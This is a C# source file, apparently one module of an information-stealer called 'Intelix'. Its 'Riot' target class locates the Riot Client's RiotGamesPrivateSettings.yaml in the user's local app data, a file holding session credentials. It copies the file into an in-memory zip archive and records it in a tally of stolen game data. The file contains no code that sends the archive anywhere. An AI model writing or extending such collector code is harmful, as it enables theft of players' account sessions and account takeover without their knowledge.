using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Games;

public class Riot : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Riot Games", "Riot Client", "Data", "RiotGamesPrivateSettings.yaml");
		if (File.Exists(text))
		{
			string text2 = Path.Combine("Riot", "RiotGamesPrivateSettings.yaml");
			zip.AddFile(text2, File.ReadAllBytes(text));
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Riot";
			counterApplications.Files.Add(text + " => " + text2);
			counter.Games.Add(counterApplications);
		}
	}
}
